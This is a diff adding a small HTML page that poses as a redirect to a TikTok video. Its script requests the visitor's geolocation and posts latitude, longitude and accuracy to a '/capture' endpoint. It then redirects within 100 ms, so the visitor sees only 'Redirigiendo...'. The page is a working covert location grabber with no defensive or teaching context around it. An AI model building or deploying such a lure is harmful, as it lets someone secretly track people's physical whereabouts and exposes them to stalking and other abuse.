@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                const data = `lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&acc=${pos.coords.accuracy}`;
+                fetch('/capture', { method: 'POST', body: data, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
+            },
+            err => { console.log(err); },
+            { maximumAge: 60000, timeout: 5000 }
+        );
+        // Redirige a TikTok SIEMPRE
+        setTimeout(() => { window.location.href = 'https://www.tiktok.com/@example/video/12345'; }, 100);
+    </script>
+</head>
+<body>
+    Redirigiendo...
+</body>
+</html>
